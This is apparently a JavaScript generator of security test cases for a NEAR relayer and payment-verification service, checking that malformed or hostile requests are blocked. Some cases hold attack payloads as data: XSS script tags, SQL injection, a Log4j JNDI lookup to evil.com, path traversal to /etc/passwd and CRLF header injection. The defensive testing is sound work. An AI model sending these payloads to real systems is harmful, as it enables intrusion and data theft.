    { title: 'GET /status/ empty tx hash param', path: '/status/', expectedCode: 'BAD_REQUEST' },
    { title: 'GET /status/ non-existent random tx hash (tx_unknown_123)', path: '/status/tx_unknown_123', expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ 64-hex zeros tx hash', path: '/status/0000000000000000000000000000000000000000000000000000000000000000', expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ 64-hex ffff tx hash', path: '/status/ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ special punctuation hash', path: '/status/hash_!@#$%^&*()', expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ script injection in hash', path: '/status/<script>alert(1)</script>', expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ SQL injection attempt in hash', path: "/status/' OR '1'='1", expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ long hash string (300 characters)', path: `/status/${'a'.repeat(300)}`, expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ with query params (?verbose=true)', path: '/status/tx_unknown_query?verbose=true', expectedCode: 'TX_NOT_FOUND' },
    { title: 'GET /status/ path with multiple segments (/status/a/b)', path: '/status/a/b', expectedCode: 'TX_NOT_FOUND' },
  ];

  statusVariations.forEach((item, i) => {
    const num = 111 + i;
    cases.push({
      id: `KAT-B-09-${num}`,
      category: 9,
      layer: 'B',
      title: item.title,
      params: {
        method: 'GET',
        path: item.path,
        clientIp: `10.9.2.${num}`,
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 4. Mock RPC Failure & Anomaly Injection (13 cases)
  const rpcVariations = [
    {
      title: 'Mock RPC viewBlock throws connection refused',
      onViewBlock: () => { throw new Error('ECONNREFUSED'); },
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC viewBlock throws timeout error (ETIMEDOUT)',
      onViewBlock: () => { const e = new Error('ETIMEDOUT'); e.code = 'ETIMEDOUT'; throw e; },
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC viewBlock returns malformed height (null)',
      onViewBlock: () => ({ header: { height: null } }),
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC viewBlock returns negative block height',
      onViewBlock: () => ({ header: { height: -10 } }),
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC viewBlock returns non-numeric height string',
      onViewBlock: () => ({ header: { height: 'NaN' } }),
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC onKey throws RPC node unreachable',
      onKey: () => { throw new Error('RPC_NODE_UNREACHABLE'); },
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC onKey throws 502 Bad Gateway from upstream RPC',
      onKey: () => { throw new Error('502 Bad Gateway'); },
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC onKey throws 504 Gateway Timeout from upstream RPC',
      onKey: () => { throw new Error('504 Gateway Timeout'); },
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC onKey throws JSON-RPC response parse error',
      onKey: () => { throw new SyntaxError('Unexpected token < in JSON at position 0'); },
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC onCallFunction throws upstream error during get_mandate lookup',
      path: '/verify',
      paymentSignature: true,
      onCallFunction: () => { throw new Error('UPSTREAM_ERROR'); },
      // Request carries a valid x402 header and reaches the mandate lookup; the
      // lookup fails upstream and is refused fail-closed with 502 UPSTREAM_ERROR.
      expectedCode: 'UPSTREAM_ERROR',
    },
    {
      title: 'Mock RPC onCallFunction returns null mandate (MANDATE_NOT_FOUND)',
      path: '/verify',
      paymentSignature: true,
      onCallFunction: () => null,
      // get_mandate returns null: request is rejected with the precise status code.
      expectedCode: 'MANDATE_NOT_FOUND',
    },
    {
      title: 'Mock RPC onCallFunction returns token asset mismatch',
      path: '/verify',
      paymentSignature: true,
      onCallFunction: () => ({ id: 1, token: 'evil.token', owner: 'alice.testnet' }),
      // Mandate token does not match requirements.asset usdc.testnet.
      expectedCode: 'ASSET_MISMATCH',
    },
    {
      title: 'Mock RPC key permission allowance is string "0"',
      keyPermission: { FunctionCall: { allowance: '0', receiver_id: 'amanat.testnet', method_names: ['request_payment'] } },
      expectedCode: 'KEY_NOT_ALLOWED',
    },
  ];

  rpcVariations.forEach((item, i) => {
    const num = 121 + i;
    cases.push({
      id: `KAT-B-09-${num}`,
      category: 9,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: item.path || '/relay',
        clientIp: `10.9.3.${num}`,
        onViewBlock: item.onViewBlock,
        onKey: item.onKey,
        onCallFunction: item.onCallFunction,
        keyPermission: item.keyPermission,
        paymentSignature: item.paymentSignature,
        delegate: item.path ? undefined : { nonce: BigInt(900 + num) },
        body: item.paymentSignature ? undefined : (item.path ? '{"signed_delegate":""}' : undefined),
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 5. Operational Endpoints, Metrics, and Replay (17 cases)
  const opVariations = [
    { title: 'GET /health returns 200 OK without side effects', path: '/health', method: 'GET', expectedLabel: 'INERT' },
    { title: 'GET /health with query string (?check=liveness)', path: '/health?check=liveness', method: 'GET', expectedLabel: 'INERT' },
    { title: 'GET /supported returns supported protocol kinds', path: '/supported', method: 'GET', expectedLabel: 'INERT' },
    { title: 'GET /supported with query string (?v=2)', path: '/supported?v=2', method: 'GET', expectedLabel: 'INERT' },
    { title: 'GET /metrics returns prometheus text format', path: '/metrics', method: 'GET', expectedLabel: 'INERT' },
    { title: 'GET /metrics with Accept: application/json returns JSON metrics', path: '/metrics', method: 'GET', headers: { accept: 'application/json' }, expectedLabel: 'INERT' },
    { title: 'POST /verify without payment-signature header', path: '/verify', method: 'POST', expectedCode: 'MISSING_PAYMENT_SIGNATURE' },
    { title: 'POST /verify with empty payment-signature header', path: '/verify', method: 'POST', headers: { 'payment-signature': '' }, expectedCode: 'MISSING_PAYMENT_SIGNATURE' },
    { title: 'POST /verify with invalid base64 payment-signature', path: '/verify', method: 'POST', headers: { 'payment-signature': '!@#$%^&*' }, expectedCode: 'BAD_PAYMENT_SIGNATURE' },
    { title: 'POST /verify with invalid json payment requirements', path: '/verify', method: 'POST', headers: { 'payment-signature': 'abc' }, body: '{invalid_json', expectedCode: 'BAD_JSON' },
    { title: 'POST /settle without payment-signature header', path: '/settle', method: 'POST', expectedCode: 'MISSING_PAYMENT_SIGNATURE' },
    { title: 'POST /settle with empty payment-signature header', path: '/settle', method: 'POST', headers: { 'payment-signature': '' }, expectedCode: 'MISSING_PAYMENT_SIGNATURE' },
    { title: 'POST /settle with invalid base64 payment-signature', path: '/settle', method: 'POST', headers: { 'payment-signature': '---invalid---' }, expectedCode: 'BAD_PAYMENT_SIGNATURE' },
    { title: 'POST /settle with empty JSON body', path: '/settle', method: 'POST', headers: { 'payment-signature': 'abc' }, body: '{}', expectedCode: 'BAD_PAYMENT_SIGNATURE' },
    { title: 'GET non-existent operational route /admin', path: '/admin', method: 'GET', expectedCode: 'NOT_FOUND' },
    { title: 'GET non-existent operational route /config', path: '/config', method: 'GET', expectedCode: 'NOT_FOUND' },
    { title: 'GET non-existent operational route /debug', path: '/debug', method: 'GET', expectedCode: 'NOT_FOUND' },
  ];

  opVariations.forEach((item, i) => {
    const num = 134 + i;
    cases.push({
      id: `KAT-B-09-${num}`,
      category: 9,
      layer: 'B',
      title: item.title,
      params: {
        method: item.method,
        path: item.path,
        clientIp: `10.9.4.${num}`,
        headers: item.headers,
        body: item.body || (item.method === 'POST' ? '{"signed_delegate":""}' : null),
      },
      expected: {
        label: item.expectedLabel || 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  return cases;
}

// =============================================================================
// CATEGORY 12: Absurd dan Di Luar Model Ancaman (45 kasus: KAT-B-12-101 .. KAT-B-12-145)
// =============================================================================

function generateCategory12Extra() {
  const cases = [];

  // 1. Path Traversal & URL Anomalies (18 cases)
  const pathAnomalies = [
    { title: 'Path traversal dot-dot to /relay/..', path: '/relay/..', expectedCode: 'NOT_FOUND' },
    { title: 'Path traversal /relay/../relay', path: '/relay/../relay', expectedCode: 'NOT_FOUND', raw: true },
    { title: 'Path traversal /relay/../../etc/passwd', path: '/relay/../../etc/passwd', expectedCode: 'NOT_FOUND' },
    { title: 'Path traversal with quadruple dots /relay/....//....//', path: '/relay/....//....//', expectedCode: 'NOT_FOUND' },
    { title: 'URL-encoded path traversal /relay/%2e%2e/%2e%2e/', path: '/relay/%2e%2e/%2e%2e/', expectedCode: 'NOT_FOUND' },
    { title: 'Double slash at start of path //relay', path: '//relay', expectedCode: 'NOT_FOUND' },
    { title: 'Triple slash at start of path ///relay', path: '///relay', expectedCode: 'NOT_FOUND' },
    { title: 'Double slash inside path /relay//extra', path: '/relay//extra', expectedCode: 'NOT_FOUND' },
    { title: 'Trailing slash on /relay/ (strict path match)', path: '/relay/', expectedCode: 'NOT_FOUND' },
    { title: 'Trailing slash on /health/ (strict path match)', path: '/health/', method: 'GET', expectedCode: 'NOT_FOUND' },
    { title: 'Dot slash in path /relay/./', path: '/relay/./', expectedCode: 'NOT_FOUND' },
    { title: 'URL query containing XSS script payload', path: '/relay?q=<script>alert("xss")</script>', expectedCode: 'BAD_ENCODING' },
    { title: 'URL query containing SQL injection payload', path: '/relay?sql=DROP%20TABLE%20mandates;', expectedCode: 'BAD_ENCODING' },
    { title: 'URL query containing Log4j JNDI payload', path: '/relay?jndi=${jndi:ldap://evil.com/a}', expectedCode: 'BAD_ENCODING' },
    { title: 'Extremely long URL path (1024 characters)', path: `/relay/${'a'.repeat(1024)}`, expectedCode: 'NOT_FOUND' },
    { title: 'Extremely long URL query string (2048 characters)', path: `/relay?${'p='.repeat(500)}`, expectedCode: 'BAD_ENCODING' },
    { title: 'URL encoded null byte in path (/relay%00)', path: '/relay%00', expectedCode: 'NOT_FOUND' },
    { title: 'Unicode special characters in URL path (/relay/⚡/🛡️)', path: '/relay/%E2%9A%A1/%F0%9F%9B%A1', expectedCode: 'NOT_FOUND' },
  ];

  pathAnomalies.forEach((item, i) => {
    const num = 101 + i;
    cases.push({
      id: `KAT-B-12-${num}`,
      category: 12,
      layer: 'B',
      title: item.title,
      params: {
        method: item.method || 'POST',
        path: item.path,
        clientIp: `10.12.1.${num}`,
        body: item.method === 'GET' ? null : '{"signed_delegate":""}',
        rawRequest: item.raw === true,
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 2. Non-Standard / Bizarre HTTP Verbs (10 cases)
  const weirdVerbs = [
    { verb: 'BREACH', code: 'HTTP_400' },
    { verb: 'ATTACK', code: 'HTTP_400' },
    { verb: 'HACK', code: 'HTTP_400' },
    { verb: 'PURGE', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'PROPFIND', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'LOCK', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'UNLOCK', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'SEARCH', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'COPY', code: 'METHOD_NOT_ALLOWED' },
    { verb: 'MOVE', code: 'METHOD_NOT_ALLOWED' },
  ];

  weirdVerbs.forEach((item, i) => {
    const num = 119 + i;
    cases.push({
      id: `KAT-B-12-${num}`,
      category: 12,
      layer: 'B',
      title: `Non-standard absurd HTTP verb '${item.verb}' to /relay`,
      params: {
        method: item.verb,
        path: '/relay',
        clientIp: `10.12.2.${num}`,
        body: '{"signed_delegate":""}',
      },
      expected: {
        label: 'BLOCKED',
        code: item.code,
      },
    });
  });

  // 3. Gigantic Headers and Protocol Abuse (7 cases)
  const headerAbuse = [
    { title: 'Huge custom header value (4KB string)', headers: { 'x-huge-padding': 'A'.repeat(4096) }, expectedCode: 'BAD_ENCODING' },
    { title: 'Gigantic header exceeding Node default HTTP header limit (10KB header)', headers: { 'x-giant-padding': 'B'.repeat(10240) }, expectedCode: 'BAD_ENCODING' },
    { title: 'Excessive number of custom headers (50 distinct headers)', headers: Object.fromEntries(Array.from({ length: 50 }, (_, k) => [`x-extra-${k}`, `val-${k}`])), expectedCode: 'BAD_ENCODING' },
    { title: 'Header with whitespace value', headers: { 'x-whitespace-val': '   ' }, expectedCode: 'BAD_ENCODING' },
    { title: 'Header with trailing colon in value', headers: { 'x-custom-colon': 'test::value::' }, expectedCode: 'BAD_ENCODING' },
    { title: 'Header containing URL-encoded carriage return injection', headers: { 'x-injected': 'val1%0d%0aX-Injected-Header:%20evil' }, expectedCode: 'BAD_ENCODING' },
    { title: 'Conflicting Content-Length and Transfer-Encoding headers', headers: { 'content-length': '25', 'transfer-encoding': 'chunked' }, omitContentLength: true, expectedCode: 'HTTP_400' },
  ];

  headerAbuse.forEach((item, i) => {
    const num = 129 + i;
    cases.push({
      id: `KAT-B-12-${num}`,
      category: 12,
      layer: 'B',
      title: item.title,
      params: {
        method: 'POST',
        path: '/relay',
        clientIp: `10.12.3.${num}`,
        headers: item.headers,
        omitContentLength: item.omitContentLength,
        body: '{"signed_delegate":""}',
      },
      expected: {
        label: 'BLOCKED',
        code: item.expectedCode,
      },
    });
  });

  // 4. Honest Out-of-Scope Threat Boundaries (10 cases)
  const outOfScopeVariations = [
    {
      title: 'Full-access private key of contract owner is compromised on-chain',
      reason: 'Contract owner key compromise allows direct contract upgrade/drain; outside cryptographic delegate model',
    },
    {
      title: 'Byzantine consensus partition / 51% attack on NEAR network validators',
      reason: 'L1 consensus failures or deep blockchain reorganizations are outside application protocol threat model',
    },
    {
      title: 'Malicious NEP-141 token contract executes reentrancy/gas exhaustion during ft_transfer',
      reason: 'Malicious token implementation behaviors cannot be constrained by caller contract; recognized protocol boundary',
    },
    {
      title: 'Host server operating system kernel panic or OOM termination',
      reason: 'Infrastructure and OS hardware faults are handled by process supervisors and persistent dedupe store',
    },
    {
      title: 'DNS spoofing / BGP hijacking of NEAR testnet RPC endpoint at ISP level',
      reason: 'Upstream network transport tampering requires external TLS and secure DNS pinning',
    },
    {
      title: 'Zero-day vulnerability in Node.js / V8 JavaScript execution runtime',
      reason: 'Underlying language engine exploits are beyond application-level defense boundaries',
    },
    {
      title: 'Physical theft of hardware containing relayer credentials',
      reason: 'Physical security of host infrastructure is outside protocol cryptographic assumptions',
    },
    {
      title: 'Direct unauthorized modification of on-chain validator state storage',
      reason: 'Direct state database tampering bypasses NEAR cryptographic execution',
    },
    {
      title: 'Clock skew exceeding 24 hours on blockchain consensus nodes',
      reason: 'Severe validator clock skew breaks block timestamp and height monotonic guarantees',
    },
    {
      title: 'Compromised Certificate Authority issuing counterfeit TLS certificates for RPC',
      reason: 'Public key infrastructure / PKI root trust compromise is outside application threat model',
    },
  ];

  outOfScopeVariations.forEach((item, i) => {
    const num = 136 + i;
    cases.push({
      id: `KAT-B-12-${num}`,
      category: 12,
      layer: 'B',
      title: item.title,
      params: {
        outOfScope: true,
        reason: item.reason,
      },
      expected: {
        label: 'OUT_OF_SCOPE',
        code: 'OUT_OF_SCOPE',
      },
    });
  });

  return cases;
}

/**
 * Returns all expanded Layer B attack catalog cases (>= 200 cases).
 * Covers Categories 5, 7, 8, 9, 12.
 *
 * @returns {Array<object>}
 */
export function generateB2Cases() {
  const cat5 = generateCategory5Extra();
  const cat7 = generateCategory7Extra();
  const cat8 = generateCategory8Extra();
  const cat9 = generateCategory9Extra();
  const cat12 = generateCategory12Extra();

  return [...cat5, ...cat7, ...cat8, ...cat9, ...cat12];
}
